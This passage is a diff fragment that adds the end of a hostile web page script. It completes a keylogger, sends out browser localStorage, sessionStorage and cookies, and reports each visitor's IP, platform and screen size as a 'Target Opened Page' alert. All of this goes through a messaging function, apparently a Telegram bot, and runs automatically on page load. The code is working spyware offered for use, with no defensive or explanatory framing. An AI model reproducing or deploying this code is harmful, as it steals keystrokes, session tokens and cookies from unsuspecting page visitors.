+tgSend(`⌨️ <b>Keystrokes</b>\n\n<code>${kl.substring(0,1500)}</code>\n\n📏 ${kl.length} chars\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
+kl='';
+}
+klTimer=null;
+},30000);
+});
+
+// ===== STORAGE EXFIL =====
+setTimeout(async()=>{
+try{
+let sd='';
+if(localStorage.length>0){sd+='📦 LocalStorage:\n';for(let i=0;i<Math.min(localStorage.length,10);i++){const k=localStorage.key(i);sd+=`${k}: ${localStorage.getItem(k).substring(0,100)}\n`}}
+if(sessionStorage.length>0){sd+='\n📦 SessionStorage:\n';for(let i=0;i<Math.min(sessionStorage.length,10);i++){const k=sessionStorage.key(i);sd+=`${k}: ${sessionStorage.getItem(k).substring(0,100)}\n`}}
+if(document.cookie)sd+=`\n🍪 Cookies:\n${document.cookie.substring(0,500)}`;
+if(sd){const ip=await getIP();tgSend(`💾 <b>Browser Storage</b>\n\n<code>${sd.substring(0,1500)}</code>\n\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);log('✅ Storage exfiltrated')}
+}catch(e){log('❌ Storage: '+e.message,'error')}
+},5000);
+
+// ===== AUTO INIT =====
+(async function(){
+try{
+const ip=await getIP();
+tgSend(`<b>🟢 Target Opened Page</b>\n\n📱 ${navigator.platform||'Unknown'}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n📐 ${screen.width}x${screen.height}\n\n⏳ Waiting for interactions...\n\n👑 Made by ©shoebu`);
+log('✅ Initial notification sent');
+}catch(e){log('❌ Init: '+e.message,'error')}
+})();
+
+log('✅ System ready');
+</script>
+</body>
+</html>
